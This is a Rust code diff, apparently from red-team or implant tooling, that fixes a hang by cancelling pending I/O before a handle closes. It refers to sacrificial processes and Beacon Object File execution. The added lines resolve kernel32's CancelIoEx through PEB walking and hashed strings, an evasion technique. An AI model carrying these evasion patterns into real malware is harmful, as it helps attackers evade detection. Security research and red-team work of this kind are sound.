@@ -218,6 +218,27 @@ impl Drop for IoChannel {
             if self.write_handle != INVALID_HANDLE_VALUE {
                 CloseHandle(self.write_handle);
             }
+            // Cancel any pending synchronous I/O on the read handle FIRST.
+            // The runner's streamer thread blocks here in ReadFile; without
+            // CancelIoEx, CloseHandle below would wait for the kernel I/O
+            // packet to complete, which never happens in some races —
+            // causing the sacrificial to hang post-orchestrate.
+            //
+            // CancelIoEx returns FALSE+ERROR_NOT_FOUND if no pending I/O,
+            // which is fine for the inline-mode BOF case (no streamer).
+            crate::dlog2(b"[io] IoChannel::drop CancelIoEx(read)");
+            type CancelIoExFn = unsafe extern "system" fn(
+                handle: HANDLE,
+                lp_overlapped: *mut core::ffi::c_void,
+            ) -> i32;
+            if let Some(k32) = opsec_peb::resolve_module(opsec_strcrypt::hash!("kernel32.dll")) {
+                if let Some(p) =
+                    opsec_peb::resolve_export(k32, opsec_strcrypt::hash!("CancelIoEx"))
+                {
+                    let f: CancelIoExFn = core::mem::transmute(p);
+                    f(self.handle, core::ptr::null_mut());
+                }
+            }
             crate::dlog2(b"[io] IoChannel::drop CloseHandle(read)");
             CloseHandle(self.handle);
             crate::dlog2(b"[io] IoChannel::drop done");
